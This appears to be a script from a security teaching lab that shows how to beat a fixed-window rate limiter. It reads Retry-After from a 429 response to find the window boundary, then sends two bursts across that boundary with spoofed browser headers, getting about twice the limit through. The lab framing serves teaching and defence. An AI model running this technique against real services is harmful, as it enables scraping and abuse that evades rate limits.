"""
Chapter 2, Round 2 attack: ride the fixed window's boundary.

A fixed window forgets its count the instant it rolls over. So the trick is to line up with
the clock: spend the window's whole limit at the very end of one window, then the whole limit
again at the start of the next. Twice the limit in a blink, every request a 200.

How does the attacker find the boundary? The store hands it over. When the limit trips, the
429 carries Retry-After: the seconds until the next window opens. Burn one request to read it,
sleep that long, and you are standing on the seam.

We measure one seam crossing, not a whole scrape: the attack sends 2 x limit requests across a
single boundary and reports how many got through. Against a well-behaved limiter that would be
`limit`; against a fixed window it is close to 2 x limit.

    python attacks/round2_boundary.py

Expected:   level 1 (monitor): 2 x limit through (nothing blocks).
            level 2 (fixed window, 20 per 10 s): ~40/40 through across the boundary (full),
            while the straight flood run next to it is capped at ~20 (partial).
"""

import collections
import json
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import browsers  # noqa: E402
from labclient import BASE_URL, LabClient, world_pool  # noqa: E402  (guard runs on import)


def _ua():
    return browsers.headers_for(("chrome", 153, "windows"), "typed", BASE_URL)


def _burst(client, ip, n, statuses):
    """Send n requests as fast as we can; count the 200s and stop early on the first 429."""
    ok = 0
    for i in range(n):
        r = client.get(f"/api/products/p{(i % 120) + 1:03d}", _ua(), ip=ip)
        statuses[r.status_code] += 1
        if r.status_code == 200:
            ok += 1
        elif r.status_code == 429:
            return ok, int(r.headers.get("Retry-After", "1") or 1)
    return ok, 0


def run(limit=20):
    # A distinct VM from the Round 1 flood (which uses cloud_vm[0]), so this run starts with a
    # clean window of its own and its two bursts straddle one boundary from empty.
    ip = world_pool("cloud_vm")[10]
    client = LabClient("bot:r2_boundary")
    statuses = collections.Counter()
    attempted = 2 * limit
    # Burst 1: fill the current window until it 429s, which also hands us the boundary.
    early, retry = _burst(client, ip, limit + 5, statuses)
    if retry:
        time.sleep(retry + 0.1)        # cross the seam into a fresh window
    # Burst 2: a fresh window's worth lands immediately after the boundary.
    late, _ = _burst(client, ip, limit, statuses)
    got = min(early, limit) + late
    return {"name": "r2_boundary", "attempted": attempted, "succeeded": got,
            "limit": limit, "statuses": dict(statuses)}


if __name__ == "__main__":
    out = run()
    print(f"{out['name']}: {out['succeeded']}/{out['attempted']} across one boundary   statuses {out['statuses']}")
    print(json.dumps(out))
